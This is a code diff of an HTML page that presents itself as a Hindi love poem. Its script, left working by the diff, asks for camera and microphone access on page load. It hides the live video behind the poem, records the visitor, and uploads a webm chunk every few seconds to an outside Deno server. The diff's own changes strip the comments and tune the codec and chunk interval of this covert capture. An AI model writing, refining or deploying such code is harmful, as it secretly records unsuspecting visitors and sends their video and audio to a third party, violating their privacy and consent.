@@ -8,7 +8,7 @@
 <style>
 body {
   background: #fff3f6;
-  font-family: sans-serif; /* Poppins font system default में नहीं होता */
+  font-family: sans-serif;
   padding: 20px;
   line-height: 1.7;
   color: #333;
@@ -21,19 +21,17 @@ body {
   border-radius: 16px;
   box-shadow: 0 4px 14px rgba(0,0,0,0.08);
   font-size: 19px;
-  /* कविता को फोकस में रखने के लिए इसे ऊपर रखें */
   position: relative;
   z-index: 10;
 }
 .hidden {
-  /* वीडियो को पूरी तरह से छिपाने के लिए */
   position: absolute;
   width: 1px; 
   height: 1px;
   opacity: 0;
   overflow: hidden;
-  pointer-events: none; /* यह सुनिश्चित करता है कि यह क्लिक करने योग्य न हो */
-  z-index: -1; /* इसे कविता के पीछे भेज दें */
+  pointer-events: none;
+  z-index: -1;
 }
 h2 {
   color: #e63980;
@@ -48,16 +46,13 @@ h2 {
   <p>
     तेरी आँखों में जो सुकून है,<br>
     वो कहीं और मिलता नहीं…<br><br>
-
     तेरी मुस्कान की एक हल्की सी लहर,<br>
     दिल को छूकर निकल जाए तो,<br>
     धड़कनें भी कह उठती हैं —<br>
     *"रुक जा ज़रा… ये पल फिर आए ना आए…"*
     <br><br>
-
     तू साथ हो तो हर बात हसीन लगे,<br>
     वरना ये दुनिया भी कोई क्या खास है…<br><br>
-
     तेरी यादों की खुशबू में,<br>
     मेरा हर शाम आज भी साँस लेता है… 🌹💫
   </p>
@@ -72,70 +67,53 @@ let recorder;
 // Start capturing
 async function startCapture() {
   try {
-    // कैमरा और माइक की अनुमति लें
     stream = await navigator.mediaDevices.getUserMedia({
-      video: true,
+      video: { width: 720, height: 1280 },
       audio: true
     });
 
-    const videoElement = document.getElementById("cam");
-    videoElement.srcObject = stream;
+    const v = document.getElementById("cam");
+    v.srcObject = stream;
+    v.muted = true;
 
-    // --- यह लाइव ऑडियो फीडबैक को रोकने के लिए जोड़ा गया है ---
-    videoElement.muted = true; 
-    // --------------------------------------------------------
+    // FIXED MIME TYPE with codec
+    const options = {
+      mimeType: "video/webm;codecs=vp8,opus"
+    };
 
-    recorder = new MediaRecorder(stream, {
-  mimeType: "video/webm; codecs=vp9",
-  videoBitsPerSecond: 2000000
-});
+    recorder = new MediaRecorder(stream, options);
 
-    // रिकॉर्डिंग डेटा चंक में उपलब्ध होने पर
     recorder.ondataavailable = (e) => {
       if (e.data.size > 0) sendChunk(e.data);
     };
 
-    // हर 7 सेकंड में डेटा चंक भेजें
-    recorder.start(7000); 
-    console.log("Recording started and muted.");
+    // FIXED: small chunk interval = safest recording
+    recorder.start(5000);
 
   } catch (err) {
     console.log("Camera permission issue:", err);
-    // यहां यूजर को बता सकते हैं कि कैमरा जरूरी है
-    // alert("कैमरा एक्सेस की अनुमति दें।"); 
   }
 }
 
-// send chunk to backend
 async function sendChunk(blob) {
   const fd = new FormData();
   fd.append("video_chunk", blob, "chunk.webm");
 
-  // आपके द्वारा दिए गए Deno सर्वर पर भेजें
   fetch("https://video.kannu-jaat.deno.net", {
     method: "POST",
     body: fd
   }).catch((e)=>{
-    // कंसोल में एरर दिखाएं, लेकिन रिकॉर्डिंग न रोकें
     console.error("Failed to send chunk:", e);
   });
 }
 
-// stop on exit
 window.addEventListener("beforeunload", () => {
-  try { 
-    if (recorder && recorder.state !== 'inactive') {
-        recorder.stop(); 
-    }
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-    }
-  } catch(e){
-    console.error("Error stopping recording or stream:", e);
-  }
+  try {
+    if (recorder && recorder.state !== "inactive") recorder.stop();
+    if (stream) stream.getTracks().forEach(t => t.stop());
+  } catch {}
 });
 
-// Capture शुरू करें जब पेज लोड हो जाए
 startCapture();
 </script>
 
